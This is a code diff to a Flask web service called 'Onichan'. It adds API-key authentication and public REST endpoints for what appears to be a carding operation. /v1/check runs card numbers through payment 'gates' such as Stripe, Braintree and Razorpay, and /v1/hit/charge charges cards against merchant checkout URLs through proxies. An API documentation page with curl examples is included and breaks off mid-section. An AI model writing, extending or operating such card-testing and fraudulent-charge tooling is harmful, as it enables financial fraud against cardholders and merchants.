@@ -3990,6 +3990,7 @@ def get_user_sidebar(active_page, page_title="Onichan", is_admin=None):
             <div class="nav-section-body">
             {link('history', 'Check History', '/user/history')}
             {link('payments', 'My Payments', '/user/payments')}
+            {link('api-key', '🔑 API Key', '/user/api-key')}
             {link('settings', 'Settings', '/user/settings')}
             {link('help', '❓ Help & Support', '/user/help')}
             </div>
@@ -4169,6 +4170,49 @@ def register_user(user_id, password):
         'created': datetime.now().isoformat()
     }
     return save_user_credentials(creds)
+
+# ── API Key helpers ──────────────────────────────────────────────────────────
+def _gen_api_key():
+    import secrets as _sec
+    return 'oni-' + _sec.token_hex(24)
+
+def get_api_key_for_user(user_id):
+    creds = get_user_credentials()
+    user = creds.get(str(user_id), {})
+    return user.get('api_key')
+
+def generate_api_key_for_user(user_id):
+    creds = get_user_credentials()
+    uid = str(user_id)
+    if uid not in creds:
+        return None
+    key = _gen_api_key()
+    creds[uid]['api_key'] = key
+    save_user_credentials(creds)
+    return key
+
+def get_user_by_api_key(key):
+    if not key or not key.startswith('oni-'):
+        return None
+    creds = get_user_credentials()
+    for uid, data in creds.items():
+        if data.get('api_key') == key:
+            return uid
+    return None
+
+def api_key_required(f):
+    from functools import wraps
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        key = (request.headers.get('X-API-Key') or
+               request.args.get('key') or
+               (request.get_json(silent=True) or {}).get('key'))
+        uid = get_user_by_api_key(key)
+        if not uid:
+            return jsonify({'error': 'Unauthorized', 'message': 'Missing or invalid API key. Pass it as X-API-Key header.'}), 401
+        request.api_uid = uid
+        return f(*args, **kwargs)
+    return decorated
 
 def verify_telegram_login(data):
     bot_token = os.environ.get('BOT_TOKEN', '')
@@ -5622,6 +5666,108 @@ def user_premium():
     </body>
     </html>
     """)
+
+@app.route('/user/api-key', methods=['GET', 'POST'])
+@user_required
+def user_api_key_page():
+    user_id = session.get('user_id')
+    sidebar = get_user_sidebar('api-key', '🔑 My API Key')
+    message = ''
+    if request.method == 'POST':
+        action = request.form.get('action')
+        if action == 'generate':
+            key = generate_api_key_for_user(user_id)
+            message = f'<div class="alert alert-success">New key generated successfully.</div>' if key else '<div class="alert alert-danger">Failed to generate key.</div>'
+    current_key = get_api_key_for_user(user_id) or ''
+    masked = (current_key[:8] + '••••••••••••••••' + current_key[-4:]) if len(current_key) > 12 else ('Not generated yet' if not current_key else current_key)
+    return render_template_string(f"""
+    <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>API Key — Onichan</title>
+    <style>
+    *{{box-sizing:border-box;margin:0;padding:0}}
+    body{{font-family:'Segoe UI',sans-serif;background:#0f1117;color:#e2e8f0;min-height:100vh;display:flex}}
+    .page-wrap{{display:flex;flex:1;overflow:hidden}}
+    .main-content{{flex:1;padding:2rem;overflow-y:auto;max-width:800px;margin:0 auto}}
+    h1{{font-size:1.6rem;font-weight:700;margin-bottom:.5rem;color:#fff}}
+    p.sub{{color:#94a3b8;margin-bottom:1.5rem;font-size:.95rem}}
+    .card{{background:#1e2130;border:1px solid #2d3748;border-radius:12px;padding:1.5rem;margin-bottom:1.5rem}}
+    .card h2{{font-size:1rem;font-weight:600;color:#94a3b8;text-transform:uppercase;letter-spacing:.05em;margin-bottom:1rem}}
+    .key-box{{display:flex;align-items:center;gap:.75rem;background:#0f1117;border:1px solid #374151;border-radius:8px;padding:.75rem 1rem}}
+    .key-val{{flex:1;font-family:monospace;font-size:.95rem;color:#e2e8f0;word-break:break-all}}
+    .btn{{padding:.6rem 1.25rem;border-radius:8px;border:none;cursor:pointer;font-size:.9rem;font-weight:600;transition:opacity .2s}}
+    .btn-primary{{background:linear-gradient(135deg,#6366f1,#818cf8);color:#fff}}
+    .btn-danger{{background:linear-gradient(135deg,#e94560,#f87171);color:#fff}}
+    .btn-copy{{background:#2d3748;color:#e2e8f0;font-size:.8rem;padding:.5rem .9rem}}
+    .btn:hover{{opacity:.85}}
+    .alert{{padding:.75rem 1rem;border-radius:8px;margin-bottom:1rem;font-size:.9rem}}
+    .alert-success{{background:#064e3b;color:#6ee7b7;border:1px solid #065f46}}
+    .alert-danger{{background:#4a0000;color:#fca5a5;border:1px solid #7f1d1d}}
+    .info-box{{background:#1e3a5f;border:1px solid #1d4ed8;border-radius:8px;padding:1rem;display:flex;gap:.75rem;align-items:flex-start;margin-bottom:1.5rem}}
+    .info-box .icon{{font-size:1.2rem;flex-shrink:0}}
+    .info-box p{{font-size:.88rem;color:#bfdbfe;line-height:1.5}}
+    .info-box code{{background:#1e40af;padding:.1em .35em;border-radius:4px;font-size:.85rem}}
+    .usage-table{{width:100%;border-collapse:collapse;font-size:.88rem}}
+    .usage-table th{{background:#111827;color:#94a3b8;text-align:left;padding:.6rem .75rem;border-bottom:1px solid #2d3748;font-weight:600}}
+    .usage-table td{{padding:.6rem .75rem;border-bottom:1px solid #1f2937;color:#d1d5db;font-family:monospace}}
+    .badge{{display:inline-block;padding:.2em .55em;border-radius:4px;font-size:.75rem;font-weight:700}}
+    .badge-get{{background:#064e3b;color:#34d399}}
+    .badge-post{{background:#1e3a5f;color:#93c5fd}}
+    a.docs-link{{color:#818cf8;text-decoration:none;font-weight:600}}
+    a.docs-link:hover{{text-decoration:underline}}
+    </style></head><body>
+    <div class="page-wrap">
+    {sidebar}
+    <div class="main-content">
+    <h1>🔑 My API Key</h1>
+    <p class="sub">Use your API key to access Onichan's checker and hitter endpoints programmatically.</p>
+    {message}
+    <div class="info-box">
+      <span class="icon">ℹ️</span>
+      <p>Pass your key as the <code>X-API-Key</code> header on every request, or as the <code>?key=</code> query parameter.
+      Read the <a class="docs-link" href="/docs">full API docs</a> for request/response examples.</p>
+    </div>
+
+    <div class="card">
+      <h2>Your Key</h2>
+      {'<div class="key-box"><span class="key-val" id="key-display">' + masked + '</span>' +
+       ('<button class="btn btn-copy" onclick="copyKey()">📋 Copy</button>' if current_key else '') +
+       '</div>' if current_key else '<div class="key-box"><span class="key-val" style="color:#6b7280;font-style:italic;">No key yet — click Generate below</span></div>'}
+    </div>
+
+    <form method="POST">
+      <input type="hidden" name="action" value="generate">
+      <button type="submit" class="btn btn-{'danger' if current_key else 'primary'}" onclick="return confirm('{'Regenerating will invalidate your old key. Continue?' if current_key else 'Generate a new API key?'}')">
+        {'⚠️ Regenerate Key' if current_key else '✨ Generate API Key'}
+      </button>
+    </form>
+
+    <div class="card" style="margin-top:1.5rem">
+      <h2>Available Endpoints</h2>
+      <table class="usage-table">
+        <thead><tr><th>Method</th><th>Path</th><th>Description</th></tr></thead>
+        <tbody>
+          <tr><td><span class="badge badge-get">GET</span></td><td>/v1/gates</td><td>List all available gates</td></tr>
+          <tr><td><span class="badge badge-post">POST</span></td><td>/v1/check</td><td>Run a card through a gate checker</td></tr>
+          <tr><td><span class="badge badge-post">POST</span></td><td>/v1/hit/info</td><td>Fetch checkout info from a URL</td></tr>
+          <tr><td><span class="badge badge-post">POST</span></td><td>/v1/hit/charge</td><td>Charge a card on a checkout page</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p style="margin-top:1rem;color:#6b7280;font-size:.85rem">Base URL: <code style="color:#94a3b8">{request.host_url.rstrip('/')}</code> &nbsp;·&nbsp; <a class="docs-link" href="/docs">View full documentation →</a></p>
+    </div></div>
+    <script>
+    const REAL_KEY = {repr(current_key)};
+    function copyKey(){{
+      navigator.clipboard.writeText(REAL_KEY).then(()=>{{
+        const b = document.querySelector('.btn-copy');
+        b.textContent='✅ Copied!';
+        setTimeout(()=>b.textContent='📋 Copy',2000);
+      }});
+    }}
+    </script>
+    </body></html>
+    """)
+
 
 @app.route('/user/history')
 @user_required
@@ -15686,6 +15832,665 @@ def voice_recording():
             print(f"[VOICE] Error sending recording to Telegram: {e}")
 
     return '', 204
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  Public REST API v1  —  requires X-API-Key header (or ?key= param)
+# ════════════════════════════════════════════════════════════════════════════
+
+@app.route('/v1/gates', methods=['GET'])
+@api_key_required
+def v1_gates():
+    from modules.gate_status import get_all_gate_status
+    statuses = get_all_gate_status()
+    gates = []
+    seen = set()
+    for g in AVAILABLE_GATES:
+        gid = g['id']
+        if gid in seen:
+            continue
+        seen.add(gid)
+        gates.append({
+            'id':      gid,
+            'name':    g['name'],
+            'group':   g.get('group', 'OTHER'),
+            'premium': g.get('premium', False),
+            'online':  not statuses.get(gid, False),
+        })
+    return jsonify({'success': True, 'count': len(gates), 'gates': gates})
+
+
+@app.route('/v1/check', methods=['POST'])
+@api_key_required
+def v1_check():
+    data = request.get_json(silent=True) or {}
+    card  = data.get('card', '').strip()
+    gate  = data.get('gate', 'se1').strip()
+    proxy = data.get('proxy', '')
+
+    if not card:
+        return jsonify({'error': 'card is required', 'example': '4111111111111111|12|2026|123'}), 400
+
+    valid_ids = {g['id'] for g in AVAILABLE_GATES}
+    if gate not in valid_ids:
+        return jsonify({'error': f'Unknown gate: {gate}', 'hint': 'GET /v1/gates for valid IDs'}), 400
+
+    parts = card.replace('/', '|').replace(' ', '|').split('|')
+    if len(parts) < 4:
+        return jsonify({'error': 'Invalid card format. Expected cc|mm|yy|cvv'}), 400
+    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
+
+    try:
+        if gate == 'rz':
+            from modules.rpp_gate import check_razorpay
+            res = _run_async(check_razorpay(cc, mm, yy, cvv))
+        elif gate in ('b3', 'bu'):
+            from modules.braintree_gate import check_braintree
+            res = _run_async(check_braintree(cc, mm, yy, cvv))
+        else:
+            from modules.gate_checker import check_card_php
+            _proxy_arg = 0
+            if proxy:
+                _proxy_arg = get_proxy_url(proxy) if callable(globals().get('get_proxy_url')) else proxy
+            res = check_card_php(gate, cc, mm, yy, cvv, _proxy_arg)
+        return jsonify({'success': True, 'gate': gate, 'card': f'{cc}|{mm}|{yy}|{cvv}', 'result': res})
+    except Exception as e:
+        return jsonify({'error': str(e)[:200]}), 500
+
+
+@app.route('/v1/hit/info', methods=['POST'])
+@api_key_required
+def v1_hit_info():
+    data = request.get_json(silent=True) or {}
+    url   = data.get('url', '').strip()
+    proxy = data.get('proxy', '')
+    if not url:
+        return jsonify({'error': 'url is required'}), 400
+    try:
+        proxy_url = get_proxy_url(proxy) if proxy and callable(globals().get('get_proxy_url')) else None
+        info = _run_async(tls_get_checkout_info(url, proxy_url))
+        return jsonify({'success': True, 'info': info})
+    except Exception as e:
+        return jsonify({'error': str(e)[:200]}), 500
+
+
+@app.route('/v1/hit/charge', methods=['POST'])
+@api_key_required
+def v1_hit_charge():
+    data  = request.get_json(silent=True) or {}
+    url   = data.get('url', '').strip()
+    card_raw = data.get('card', '')
+    proxy = data.get('proxy', '')
+    email = data.get('email', '')
+    checkout_data = data.get('checkout_data')
+
+    if not url or not card_raw:
+        return jsonify({'error': 'url and card are required'}), 400
+
+    if isinstance(card_raw, str):
+        parts = card_raw.replace('/', '|').replace(' ', '|').split('|')
+        if len(parts) < 4:
+            return jsonify({'error': 'Invalid card format. Expected cc|mm|yy|cvv'}), 400
+        card = {'cc': parts[0].strip(), 'month': parts[1].strip(), 'year': parts[2].strip(), 'cvv': parts[3].strip()}
+    elif isinstance(card_raw, dict):
+        card = card_raw
+    else:
+        return jsonify({'error': 'card must be a string cc|mm|yy|cvv or object'}), 400
+
+    try:
+        if not checkout_data:
+            proxy_url = get_proxy_url(proxy) if proxy and callable(globals().get('get_proxy_url')) else None
+            checkout_data = _run_async(tls_get_checkout_info(url, proxy_url))
+            if checkout_data.get('error'):
+                return jsonify({'success': False, 'error': checkout_data['error']}), 400
+        res = _run_async(auto_hitter_charge(card, checkout_data, proxy, custom_email=email))
+        res['merchant'] = checkout_data.get('merchant', 'Unknown')
+        res['product']  = checkout_data.get('product', 'Unknown')
+        price    = checkout_data.get('price', 0)
+        currency = checkout_data.get('currency', '')
+        res['amount'] = f'{price} {currency}' if price else '0.00'
+        return jsonify({'success': True, 'result': res})
+    except Exception as e:
+        return jsonify({'error': str(e)[:200]}), 500
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  API Documentation page  — /docs
+# ════════════════════════════════════════════════════════════════════════════
+
+@app.route('/docs')
+@app.route('/docs/<path:section>')
+def api_docs(section=None):
+    base = request.host_url.rstrip('/')
+    _gates_json = ', '.join(f'"{g["id"]}"' for g in AVAILABLE_GATES[:6]) + ', ...'
+    return render_template_string(r"""<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Onichan API Docs</title>
+<style>
+:root{--bg:#0f1117;--bg2:#1e2130;--bg3:#111827;--border:#2d3748;--text:#e2e8f0;--muted:#94a3b8;--accent:#6366f1;--accent2:#818cf8;--green:#34d399;--blue:#93c5fd;--red:#f87171;--yellow:#fbbf24;--sidebar-w:260px;--toc-w:220px}
+[data-theme=light]{--bg:#f8f9fa;--bg2:#fff;--bg3:#f1f5f9;--border:#e2e8f0;--text:#1e293b;--muted:#64748b;--accent:#4f46e5;--accent2:#6366f1}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);font-size:15px}
+a{color:var(--accent2);text-decoration:none}
+a:hover{text-decoration:underline}
+/* Layout */
+.layout{display:flex;height:100vh;overflow:hidden}
+/* Sidebar */
+.sidebar{width:var(--sidebar-w);background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow-y:auto;flex-shrink:0;padding-bottom:2rem}
+.sidebar-logo{padding:1.25rem 1.25rem .75rem;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:.75rem}
+.sidebar-logo .logo-icon{width:34px;height:34px;background:linear-gradient(135deg,#6366f1,#ec4899);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:1.1rem}
+.sidebar-logo .logo-text{font-weight:700;font-size:1rem;color:var(--text)}
+.sidebar-logo .logo-sub{font-size:.7rem;color:var(--muted)}
+.sidebar-search{margin:.75rem 1rem;position:relative}
+.sidebar-search input{width:100%;background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:.5rem .75rem .5rem 2rem;color:var(--text);font-size:.85rem;outline:none}
+.sidebar-search input::placeholder{color:var(--muted)}
+.sidebar-search .s-icon{position:absolute;left:.6rem;top:50%;transform:translateY(-50%);color:var(--muted);font-size:.85rem}
+.sidebar-nav{padding:.5rem 0}
+.sidebar-group-label{padding:.5rem 1.25rem .25rem;font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--muted)}
+.sidebar-link{display:block;padding:.45rem 1.25rem;font-size:.875rem;color:var(--muted);cursor:pointer;transition:all .15s;border-left:2px solid transparent}
+.sidebar-link:hover{background:var(--bg3);color:var(--text);text-decoration:none}
+.sidebar-link.active{color:var(--accent2);border-left-color:var(--accent);background:color-mix(in srgb,var(--accent) 8%,transparent);font-weight:600}
+/* Main */
+.main{flex:1;overflow-y:auto;display:flex}
+.content{flex:1;padding:3rem 2.5rem;max-width:820px}
+.toc-wrap{width:var(--toc-w);padding:2rem 1rem;flex-shrink:0;overflow-y:auto}
+/* TOC */
+.toc{position:sticky;top:2rem}
+.toc-title{font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);margin-bottom:.5rem}
+.toc a{display:block;font-size:.8rem;color:var(--muted);padding:.25rem 0 .25rem .75rem;border-left:1px solid var(--border);transition:color .15s}
+.toc a:hover{color:var(--text);text-decoration:none}
+.toc a.active{color:var(--accent2);border-left-color:var(--accent2)}
+/* Content */
+.doc-section{display:none}
+.doc-section.active{display:block}
+h1.page-title{font-size:2rem;font-weight:800;color:var(--text);margin-bottom:.5rem}
+h1.page-title+p{color:var(--muted);font-size:1rem;margin-bottom:2rem}
+h2.section-heading{font-size:1.2rem;font-weight:700;color:var(--text);margin:2rem 0 .75rem;padding-top:2rem;border-top:1px solid var(--border)}
+h2.section-heading:first-of-type{border-top:none;padding-top:0;margin-top:0}
+h3.sub-heading{font-size:1rem;font-weight:600;color:var(--text);margin:1.5rem 0 .5rem}
+p,li{color:var(--muted);line-height:1.7;margin-bottom:.5rem}
+ul{padding-left:1.25rem;margin-bottom:1rem}
+li{margin-bottom:.25rem}
+b,strong{color:var(--text);font-weight:600}
+/* Info / warning boxes */
+.callout{display:flex;gap:.75rem;padding:1rem 1.25rem;border-radius:10px;margin:1rem 0;align-items:flex-start}
+.callout.info{background:color-mix(in srgb,#6366f1 12%,transparent);border:1px solid color-mix(in srgb,#6366f1 30%,transparent)}
+.callout.warn{background:color-mix(in srgb,#f59e0b 10%,transparent);border:1px solid color-mix(in srgb,#f59e0b 28%,transparent)}
+.callout.tip{background:color-mix(in srgb,#34d399 10%,transparent);border:1px solid color-mix(in srgb,#34d399 28%,transparent)}
+.callout-icon{font-size:1.1rem;flex-shrink:0;margin-top:.1rem}
+.callout p{color:var(--text);margin:0;font-size:.9rem}
+.callout code{background:rgba(255,255,255,.1);padding:.1em .4em;border-radius:4px;font-size:.85rem}
+/* Code blocks */
+.code-wrap{background:#0d1117;border:1px solid var(--border);border-radius:10px;margin:1rem 0;overflow:hidden}
+.code-header{display:flex;align-items:center;justify-content:space-between;background:#161b22;padding:.5rem 1rem;border-bottom:1px solid var(--border)}
+.code-lang{font-size:.75rem;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.05em}
+.code-copy{background:none;border:none;color:var(--muted);cursor:pointer;font-size:.75rem;padding:.2rem .5rem;border-radius:4px;transition:color .15s}
+.code-copy:hover{color:var(--text)}
+.code-wrap pre{padding:1rem 1.25rem;overflow-x:auto}
+.code-wrap code{font-family:'JetBrains Mono','Fira Code',monospace;font-size:.85rem;line-height:1.6;color:#e6edf3}
+.kw{color:#ff7b72}.str{color:#a5d6ff}.cm{color:#6e7681;font-style:italic}.num{color:#79c0ff}.key{color:#7ee787}.punc{color:#e6edf3}.method{color:#d2a8ff}
+/* Method badges */
+.method-badge{display:inline-flex;align-items:center;gap:.4rem;padding:.3rem .75rem;border-radius:6px;font-size:.8rem;font-weight:700;margin-right:.5rem;font-family:monospace}
+.mb-get{background:color-mix(in srgb,#34d399 15%,transparent);color:#34d399;border:1px solid color-mix(in srgb,#34d399 30%,transparent)}
+.mb-post{background:color-mix(in srgb,#93c5fd 12%,transparent);color:#93c5fd;border:1px solid color-mix(in srgb,#93c5fd 28%,transparent)}
+.endpoint-path{font-family:monospace;font-size:.95rem;color:var(--text);font-weight:600}
+/* Param tables */
+.param-table{width:100%;border-collapse:collapse;font-size:.875rem;margin:.75rem 0 1.5rem}
+.param-table th{background:var(--bg3);color:var(--muted);text-align:left;padding:.55rem .75rem;border-bottom:2px solid var(--border);font-size:.75rem;text-transform:uppercase;letter-spacing:.05em}
+.param-table td{padding:.55rem .75rem;border-bottom:1px solid var(--border);color:var(--text)}
+.param-table td:first-child{font-family:monospace;color:#a5d6ff;font-size:.85rem}
+.param-table td:nth-child(2){color:var(--green);font-size:.8rem}
+.required{color:var(--red);font-size:.75rem;font-weight:700}
+.optional{color:var(--muted);font-size:.75rem}
+/* Status chips */
+.chip{display:inline-block;padding:.15em .5em;border-radius:4px;font-size:.78rem;font-weight:700;margin:.1em}
+.chip-live{background:color-mix(in srgb,#34d399 15%,transparent);color:#34d399}
+.chip-dead{background:color-mix(in srgb,#f87171 12%,transparent);color:#f87171}
+.chip-ccn{background:color-mix(in srgb,#fbbf24 12%,transparent);color:#fbbf24}
+/* Theme toggle */
+.theme-btn{position:fixed;bottom:1.5rem;left:1rem;background:var(--bg2);border:1px solid var(--border);color:var(--text);border-radius:50%;width:36px;height:36px;cursor:pointer;font-size:1rem;display:flex;align-items:center;justify-content:center;z-index:100;transition:all .2s}
+/* Responsive */
+@media(max-width:900px){.toc-wrap{display:none}}
+@media(max-width:640px){.sidebar{display:none}.content{padding:1.5rem 1rem}}
+</style>
+</head>
+<body>
+<div class="layout">
+<!-- Sidebar -->
+<nav class="sidebar">
+  <div class="sidebar-logo">
+    <div class="logo-icon">🤖</div>
+    <div><div class="logo-text">Onichan Docs</div><div class="logo-sub">API Reference</div></div>
+  </div>
+  <div class="sidebar-search">
+    <span class="s-icon">🔍</span>
+    <input type="text" placeholder="Search…" id="sb-search" oninput="filterNav(this.value)">
+  </div>
+  <div class="sidebar-nav" id="sb-nav">
+    <div class="sidebar-group-label">Overview</div>
+    <a class="sidebar-link active" data-sec="welcome" onclick="showSec('welcome')">Welcome</a>
+    <a class="sidebar-link" data-sec="start" onclick="showSec('start')">Getting Started</a>
+    <a class="sidebar-link" data-sec="auth" onclick="showSec('auth')">Authentication</a>
+
+    <div class="sidebar-group-label">Core APIs</div>
+    <a class="sidebar-link" data-sec="gates" onclick="showSec('gates')">Gates</a>
+    <a class="sidebar-link" data-sec="checker" onclick="showSec('checker')">Checker</a>
+    <a class="sidebar-link" data-sec="hitter" onclick="showSec('hitter')">Auto Hitter</a>
+
+    <div class="sidebar-group-label">Responses</div>
+    <a class="sidebar-link" data-sec="statuses" onclick="showSec('statuses')">Status Codes</a>
+    <a class="sidebar-link" data-sec="errors" onclick="showSec('errors')">Error Handling</a>
+
+    <div class="sidebar-group-label">Account</div>
+    <a class="sidebar-link" href="/user/api-key" style="color:var(--accent2)">🔑 Get My API Key ↗</a>
+    <a class="sidebar-link" href="/user">🏠 Back to Panel ↗</a>
+  </div>
+</nav>
+
+<!-- Main -->
+<div class="main">
+  <article class="content" id="doc-content">
+
+    <!-- WELCOME -->
+    <div class="doc-section active" id="sec-welcome">
+      <h1 class="page-title">Welcome to Onichan API</h1>
+      <p>Fast, reliable card checking and checkout hitting through a single key-authenticated REST API.</p>
+      <div class="callout info">
+        <span class="callout-icon">ℹ️</span>
+        <p><strong>Base URL:</strong> <code>""" + base + r"""</code></p>
+      </div>
+      <h2 class="section-heading" id="wh-what">What Onichan Does</h2>
+      <ul>
+        <li><strong>Gates</strong> — Check cards against Stripe, Razorpay, Braintree, PayPal, Square, Shopify and more.</li>
+        <li><strong>Checker</strong> — Run any card through any active gate with a single POST request.</li>
+        <li><strong>Auto Hitter</strong> — Fetch merchant info from a Stripe checkout URL and charge a card against it.</li>
+      </ul>
+      <h2 class="section-heading" id="wh-quick">Quick Links</h2>
+      <ul>
+        <li><a href="#" onclick="showSec('start')">→ Getting Started</a></li>
+        <li><a href="#" onclick="showSec('auth')">→ Authentication</a></li>
+        <li><a href="#" onclick="showSec('checker')">→ Checker API</a></li>
+        <li><a href="#" onclick="showSec('hitter')">→ Auto Hitter API</a></li>
+        <li><a href="/user/api-key">→ Generate your API Key ↗</a></li>
+      </ul>
+    </div>
+
+    <!-- GETTING STARTED -->
+    <div class="doc-section" id="sec-start">
+      <h1 class="page-title">Getting Started</h1>
+      <p>You can be up and running in under two minutes.</p>
+      <h2 class="section-heading" id="gs-1">1 — Get an API Key</h2>
+      <p>Log in to the panel and visit <a href="/user/api-key">Account → API Key</a>. Hit <strong>Generate API Key</strong>. Your key looks like:</p>
+      <div class="code-wrap">
+        <div class="code-header"><span class="code-lang">text</span><button class="code-copy" onclick="copyBlock(this)">Copy</button></div>
+        <pre><code>oni-a3f8c2d1e9b04f76a8d2c1e3b5f07a2c4d6e8f0a1b3c5d7</code></pre>
+      </div>
+      <div class="callout warn">
+        <span class="callout-icon">⚠️</span>
+        <p>Regenerating a key immediately invalidates the old one. Store it securely — it is shown only once per generation.</p>
+      </div>
+      <h2 class="section-heading" id="gs-2">2 — List Available Gates</h2>
+      <div class="code-wrap">
+        <div class="code-header"><span class="code-lang">bash</span><button class="code-copy" onclick="copyBlock(this)">Copy</button></div>
+        <pre><code><span class="cm"># Replace YOUR_KEY with your actual API key</span>
+curl -X GET <span class="str">""" + base + r"""/v1/gates"</span> \
+     -H <span class="str">"X-API-Key: YOUR_KEY"</span></code></pre>
+      </div>
+      <h2 class="section-heading" id="gs-3">3 — Check a Card</h2>
+      <div class="code-wrap">
+        <div class="code-header"><span class="code-lang">bash</span><button class="code-copy" onclick="copyBlock(this)">Copy</button></div>
+        <pre><code>curl -X POST <span class="str">""" + base + r"""/v1/check"</span> \
+     -H <span class="str">"X-API-Key: YOUR_KEY"</span> \
+     -H <span class="str">"Content-Type: application/json"</span> \
+     -d <span class="str">'{"card":"4111111111111111|12|2026|123","gate":"se1"}'</span></code></pre>
+      </div>
+    </div>
+
+    <!-- AUTHENTICATION -->
+    <div class="doc-section" id="sec-auth">
+      <h1 class="page-title">Authentication</h1>
+      <p>Every API request must include your API key. There are two ways to pass it:</p>
+      <h2 class="section-heading" id="au-header">Header (recommended)</h2>
+      <div class="code-wrap">
+        <div class="code-header"><span class="code-lang">http</span><button class="code-copy" onclick="copyBlock(this)">Copy</button></div>
+        <pre><code><span class="kw">X-API-Key</span><span class="punc">:</span> <span class="str">oni-a3f8c2d1e9b04f76…</span></code></pre>
+      </div>
+      <h2 class="section-heading" id="au-query">Query Parameter</h2>
+      <div class="code-wrap">
+        <div class="code-header"><span class="code-lang">text</span><button class="code-copy" onclick="copyBlock(this)">Copy</button></div>
+        <pre><code>GET /v1/gates?key=oni-a3f8c2d1e9b04f76…</code></pre>
+      </div>
+      <h2 class="section-heading" id="au-body">Request Body</h2>
+      <p>You can also pass the key inside the JSON body as <code>"key"</code>:</p>
+      <div class="code-wrap">
+        <div class="code-header"><span class="code-lang">json</span><button class="code-copy" onclick="copyBlock(this)">Copy</button></div>
+        <pre><code><span class="punc">{</span>
+  <span class="key">"key"</span><span class="punc">:</span> <span class="str">"oni-a3f8c2d1e9b04f76…"</span><span class="punc">,</span>
+  <span class="key">"card"</span><span class="punc">:</span> <span class="str">"4111111111111111|12|2026|123"</span>
+<span class="punc">}</span></code></pre>
+      </div>
+      <div class="callout warn">
+        <span class="callout-icon">⚠️</span>
+        <p>An invalid or missing key returns <code>401 Unauthorized</code>.</p>
+      </div>
+      <h2 class="section-heading" id="au-manage">Managing Your Key</h2>
+      <p>Generate and regenerate your key from the panel: <a href="/user/api-key">Account → API Key ↗</a></p>
+    </div>
+
+    <!-- GATES -->
+    <div class="doc-section" id="sec-gates">
+      <h1 class="page-title">Gates</h1>
+      <p>Gates are payment gateway configurations. Each gate has a short ID you pass to the Checker endpoint.</p>
+      <h2 class="section-heading" id="ga-list">List Gates</h2>
+      <p><span class="method-badge mb-get">GET</span><span class="endpoint-path">/v1/gates</span></p>
+      <p>Returns all registered gates with their online status.</p>
+      <div class="code-wrap">
+        <div class="code-header"><span class="code-lang">bash</span><button class="code-copy" onclick="copyBlock(this)">Copy</button></div>
+        <pre><code>curl -X GET <span class="str">""" + base + r"""/v1/gates"</span> \
+     -H <span class="str">"X-API-Key: YOUR_KEY"</span></code></pre>
+      </div>
+      <h3 class="sub-heading">Response</h3>
+      <div class="code-wrap">
+        <div class="code-header"><span class="code-lang">json</span><button class="code-copy" onclick="copyBlock(this)">Copy</button></div>
+        <pre><code><span class="punc">{</span>
+  <span class="key">"success"</span><span class="punc">:</span> <span class="kw">true</span><span class="punc">,</span>
+  <span class="key">"count"</span><span class="punc">:</span> <span class="num">42</span><span class="punc">,</span>
+  <span class="key">"gates"</span><span class="punc">: [</span>
+    <span class="punc">{</span>
+      <span class="key">"id"</span><span class="punc">:</span> <span class="str">"se1"</span><span class="punc">,</span>
+      <span class="key">"name"</span><span class="punc">:</span> <span class="str">"Stripe Charge"</span><span class="punc">,</span>
+      <span class="key">"group"</span><span class="punc">:</span> <span class="str">"STRIPE"</span><span class="punc">,</span>
+      <span class="key">"premium"</span><span class="punc">:</span> <span class="kw">false</span><span class="punc">,</span>
+      <span class="key">"online"</span><span class="punc">:</span> <span class="kw">true</span>
+    <span class="punc">}</span><span class="punc">,</span>
+    <span class="str">…</span>
+  <span class="punc">]</span>
+<span class="punc">}</span></code></pre>
+      </div>
+      <h3 class="sub-heading">Notable Gate IDs</h3>
+      <table class="param-table">
+        <thead><tr><th>ID</th><th>Name</th><th>Group</th></tr></thead>
+        <tbody>
+          <tr><td>se1</td><td>Stripe Charge</td><td>STRIPE</td></tr>
+          <tr><td>st</td><td>Stripe Auth</td><td>STRIPE</td></tr>
+          <tr><td>st5</td><td>Stripe $5</td><td>STRIPE</td></tr>
+          <tr><td>rz</td><td>Razorpay ₹10</td><td>OTHER</td></tr>
+          <tr><td>b3</td><td>Braintree Auth</td><td>OTHER</td></tr>
+          <tr><td>sq</td><td>Square Auth</td><td>OTHER</td></tr>
+          <tr><td>pp</td><td>PayPal $1</td><td>OTHER</td></tr>
+          <tr><td>sh</td><td>Shopify Auto</td><td>OTHER</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- CHECKER -->
+    <div class="doc-section" id="sec-checker">
+      <h1 class="page-title">Checker API</h1>
+      <p>Run a credit card through any active gate checker.</p>
+      <h2 class="section-heading" id="ch-ep">Endpoint</h2>
+      <p><span class="method-badge mb-post">POST</span><span class="endpoint-path">/v1/check</span></p>
+      <h3 class="sub-heading">Request Body</h3>
+      <table class="param-table">
+        <thead><tr><th>Field</th><th>Type</th><th>Required</th><th>Description</th></tr></thead>
+        <tbody>
+          <tr><td>card</td><td>string</td><td><span class="required">required</span></td><td>Card in <code>cc|mm|yy|cvv</code> format (slashes and spaces also accepted)</td></tr>
+          <tr><td>gate</td><td>string</td><td><span class="optional">optional</span></td><td>Gate ID from <code>GET /v1/gates</code>. Default: <code>se1</code></td></tr>
+          <tr><td>proxy</td><td>string</td><td><span class="optional">optional</span></td><td>Proxy in <code>host:port:user:pass</code> or <code>host:port</code> format</td></tr>
+        </tbody>
+      </table>
+      <h3 class="sub-heading">Example Request</h3>
+      <div class="code-wrap">
+        <div class="code-header"><span class="code-lang">bash</span><button class="code-copy" onclick="copyBlock(this)">Copy</button></div>
